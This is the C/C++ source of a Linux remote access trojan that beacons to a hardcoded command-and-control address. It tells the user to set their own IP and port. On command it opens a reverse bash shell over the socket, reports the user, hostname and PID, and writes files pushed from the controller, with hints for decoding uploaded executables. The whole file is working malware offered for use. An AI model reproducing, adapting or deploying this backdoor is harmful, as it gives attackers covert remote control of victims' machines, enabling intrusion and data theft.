// C
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <stdlib.h>
#include <pwd.h>

#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <arpa/inet.h>

// C++
#include <iostream>
 
#define DEFAULT_BUFLEN 1024

/*======== HELPER FUNCTIONS ========*/
char *strremove(char *str, const char *sub) {
    char *p, *q, *r;
    if ((q = r = strstr(str, sub)) != NULL) {
        size_t len = strlen(sub);
        while ((r = strstr(p = r + len, sub)) != NULL) {
            while (p < r)
                *q++ = *p++;
        }
        while ((*q++ = *p++) != '\0')
            continue;
    }
    return str;
}

/* The Itoa code is in the public domain - https://www.daniweb.com/programming/software-development/threads/148080/itoa-function-or-similar-in-linux */
char* itoa(int value, char* str, int radix) {
    static char dig[] =
        "0123456789"
        "abcdefghijklmnopqrstuvwxyz";
    int n = 0, neg = 0;
    unsigned int v;
    char* p, *q;
    char c;

    if (radix == 10 && value < 0) {
        value = -value;
        neg = 1;
    }
    v = value;
    do {
        str[n++] = dig[v%radix];
        v /= radix;
    } while (v);
    if (neg)
        str[n++] = '-';
    str[n] = '\0';

    for (p = str, q = p + (n-1); p < q; ++p, --q)
        c = *p, *p = *q, *q = c;
    return str;
}



/*======== RAT FUNCTIONS ========*/
int upload(char *filename, char *content){
	errno = 0;
	FILE *outfile;
	outfile = fopen(filename, "w");
	if (!outfile) {
		return errno;
	}
	else {
		fwrite(content,strlen(content),1,outfile);
		fclose(outfile);
		return 0;
	}
}

void RAT(char* C2_Server, int C2_Port)
{
    srand(time(0));

    while (true)
    {
        sleep((rand() % 45) + 10);    // Trys to reconnect every 10-45 seconds

        int tcp_sock;
        struct sockaddr_in client;
        
        client.sin_family = AF_INET;
        client.sin_addr.s_addr = inet_addr(C2_Server);
        client.sin_port = htons(C2_Port);

        tcp_sock = socket(AF_INET,SOCK_STREAM,0);

        if (connect(tcp_sock,(struct sockaddr *)&client,sizeof(client)) == -1)
        {
            close(tcp_sock);
            continue;
        }
        else
        {

            char CommandReceived[DEFAULT_BUFLEN] = "";
            memset(CommandReceived, 0, sizeof(CommandReceived));

            while (true)
            {
                int sock_result = recv(tcp_sock, CommandReceived, DEFAULT_BUFLEN, 0);

                std::cout << "Command received: " << CommandReceived;
                std::cout << "Length of Command received: " << sock_result << std::endl;

                // tokenize input to parse arguments
                char * command;
                char delim[] = " ";
                command = strtok(CommandReceived, delim);


                if (sock_result <= 0)
                {
                    close(tcp_sock);
                    std::cout << "Socket killed. Sleep Start" << std::endl;
                    sleep(1);
                    std::cout << "Dying..." << std::endl;
                    exit(0);
                }

                // Should only be used in individual interactive environments == TBC
                if ((strcmp(command, "shell") == 0))
                {
                    std::cout << "Entering shell exec..." << std::endl;

                    int dup_orig_stdin  = dup(0);
                    int dup_orig_stdout  = dup(1);
                    int dup_orig_stderr  = dup(2);

                    pid_t pid = fork();
                    
                    if (pid == 0)
                    {
                        // Establish descriptor handling
                        dup2(tcp_sock,0); // STDIN
                        dup2(tcp_sock,1); // STDOUT
                        dup2(tcp_sock,2); // STDERR

                        // execute bin/bash << 0,1,2
                        execl("/bin/bash","bash", "-i",NULL,NULL);
                        exit(0x0);
                    }
                    else
                    {
                        if (pid < 0) return;
                        wait(NULL);
                    }

                    std::cout << "Exiting shell exec..." << std::endl;
                    
                    // Recover fd's and close duplicates
                    dup2(dup_orig_stdin,0);
                    dup2(dup_orig_stdout,1);
                    dup2(dup_orig_stderr,2);

                    close(dup_orig_stdin);
                    close(dup_orig_stdout);
                    close(dup_orig_stderr);

                    // Clear memory
                    // memset(CommandReceived, 0, sizeof(CommandReceived));

                    // When the process exits, we send an agent-msg over to alert the C2
                    char buffer[64] = "";
                    strcat(buffer,"[* Agent-Msg] Exiting shell\n");
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                // Operating System
                else if ((strcmp(command, "operating-system-probe") == 0))
                {
                    char buffer[257] = "";
                    strcat(buffer, "bGludXgK");
                    //strcat(buffer, "\n");
                    send(tcp_sock, buffer, strlen(buffer) + 1, 0);

                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else if (strcmp(command, "ping") == 0)
                {
                    char buffer[64] = "";
                    strcat(buffer,"PONG\n");
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
			    }
                else if (strcmp(command, "beacon-probe") == 0)
                {
                    char buffer[128] = "";
                    strcat(buffer,"d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy");
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
			    }
                //double check - test
                else if (strcmp(command, "getpid") == 0)
                {
                    char buffer[128] = "";

                    pid_t pid = getpid();
                    char t_pid[8];   // long
                    sprintf(t_pid, "%d", pid); // ew

                    strcat(buffer,t_pid);
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
			    }
                else if (strcmp(command, "whoami") == 0)
                {
                    char buffer[128] = "";

                    struct passwd *p = getpwuid(getuid());  // Check for NULL!
                    strcat(buffer,p->pw_name);
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
			    }
                else if (strcmp(command, "hostname") == 0)
                {
                    char buffer[512] = "";
                    char hostname[256];
                    gethostname(hostname, sizeof(hostname));  // Check the return value!
                    strcat(buffer,hostname);
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
			    }
                else if (strcmp(command, "exit") == 0)
                {
                    close(tcp_sock);
                    std::cout << "Socket killed. Sleep Start" << std::endl;
                    sleep(1);
                    std::cout << "Sleep End... Returning" << std::endl;
                    break;
                }
                else if (strcmp(command, "kill") == 0) 
                {
                    char buffer[64] = "";
                    strcat(buffer,"ZGVhZA");
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    close(tcp_sock);
                    std::cout << "Socket killed. Sleep Start" << std::endl;
                    sleep(1);
                    std::cout << "Dying..." << std::endl;
                    exit(0);
			    }
                // test - new
                else if (strstr(command, "upload"))
                {
                    char * filename = strtok(NULL, delim);
                    char * data_length = strtok(NULL, delim);
                    int data_length_int = atoi(data_length);
                    
                    // receiving data
                    char base64file[data_length_int];
                    memset(base64file, 0, sizeof(base64file));
                    
                    char buffer[255] = "";
                    strcat(buffer, "[!] Saving file in Base64 format as ");
                    strcat(buffer, filename);
                    strcat(buffer, "\n");
                    strcat(buffer, "    Decode it using:\n\n\tcertutil -decode c:\\foo.asc c:\\foo.exe");
                    strcat(buffer, "    \n\tOR\n\tcat foo.asc | base64 -d > foo");

                    
                    send(tcp_sock, buffer, strlen(buffer)+1,0); // send response
                    
                    int recv_result = recv(tcp_sock, base64file, data_length_int, 0);

                    if (recv_result <= 0)
                    {
                        close(tcp_sock);
                        std::cout << "Error received during upload procedure. Socket killed. Sleep Start" << std::endl;
                        sleep(1);
                        std::cout << "Returning to loop..." << std::endl;     
                        break;               
                    }

                    // uploading
                    int file_result;
                    file_result = upload(filename,base64file);
                    
                    // C&C part
                    memset(buffer, 0, sizeof(buffer));
                    if (file_result == 0) {
                        strcat(buffer,"\n[+] Uploaded: "); 
                        strcat(buffer,filename); 
                    }
                    else { 
                        strcat(buffer,"\n[-] Failed to write file. Errno from fopen: "); 

                        // parse errno
                        char errnos[2];
                        memset(errnos,0,2);
                        itoa(file_result,errnos,10);
                        strcat(buffer,errnos);
                    }
                    strcat(buffer,"\n");
                    
                    // Send result info
                    send(tcp_sock,buffer,strlen(buffer)+1,0);

                    // clear buffers
                    memset(base64file, 0, sizeof(base64file));
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived)); 
                }
                else
                {
                    char buffer[64] = "";
                    strcat(buffer,"[* Agent-Msg] Invalid Command\n");
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
            }
        }
    }
}

int main (int argc, char **argv)
{
    char host[] = "192.168.75.100";     // change this to your ip address
    int port = 1337;                    // change this to your open port
    RAT(host, port);

    return 0;
}